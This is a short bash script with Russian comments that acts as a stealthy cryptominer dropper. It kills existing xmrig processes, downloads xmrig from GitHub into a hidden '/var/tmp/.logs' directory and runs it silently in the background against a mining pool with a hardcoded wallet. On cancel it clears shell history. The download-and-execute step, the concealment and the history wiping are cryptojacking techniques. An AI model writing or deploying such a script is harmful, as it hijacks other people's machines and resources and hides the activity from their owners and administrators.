#!/bin/bash

# Функция для скачивания файла
download_file() {
    local url=$1
    local output_path=$2

    if command -v wget &> /dev/null; then
        echo "Используем wget для скачивания..."
        wget "$url" -O "$output_path" &> /dev/null
    elif command -v curl &> /dev/null; then
        echo "wget не найден, используем curl для скачивания..."
        curl -L "$url" -o "$output_path" &> /dev/null
    else
        echo "Ни wget, ни curl не установлены. Установите один из них и повторите попытку."
        exit 1
    fi
}

# Ищем запущенные процессы xmrig
process=$(pgrep -fl xmrig)

if [ -n "$process" ]; then
    echo "Найден процесс xmrig:"
    # Выводим полную команду запуска процесса
    echo "$process" | awk '{print $1}' | xargs ps -o pid,cmd -p
    echo "Выберите действие:"
    echo "1) Убить процесс и начать скачивание новой версии"
    echo "2) Отменить запуск скрипта"
    read -p "Ваш выбор: " choice

    if [ "$choice" == "1" ]; then
        # Убиваем процесс xmrig
        pkill -f xmrig
        echo "Процесс xmrig убит. Начинаем скачивание..."
    else
        echo "Скрипт отменен."
        history -c
        clear
        exit 0
    fi
else
    echo "Процесс xmrig не найден. Начинаем скачивание новой версии..."
fi

# Создаем скрытый терминал для скачивания и запуска
(
    # Путь к архиву и директории
    archive_path="/var/tmp/.logs/xmrig.tar.gz"
    download_url="https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz"

    # Скачиваем архив xmrig
    mkdir -p /var/tmp/.logs
    download_file "$download_url" "$archive_path"

    # Распаковываем архив
    tar -xzf "$archive_path" -C /var/tmp/.logs/ &> /dev/null

    # Переходим в директорию
    cd /var/tmp/.logs/xmrig-6.22.0

    # Делаем файл исполняемым
    chmod +x ./xmrig

    # Запускаем xmrig
    ./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 -u PEPE:0x6c12d35208e9be438ae91F15A4B3A99afb70Eadf.unmineable_worker_$(shuf -i 1000-9999 -n 1)-$(date +%s) #r1yo-9w78 -p x >/dev/null 2>&1 & disown
)

echo "Скачивание и запуск xmrig происходит в фоновом режиме."
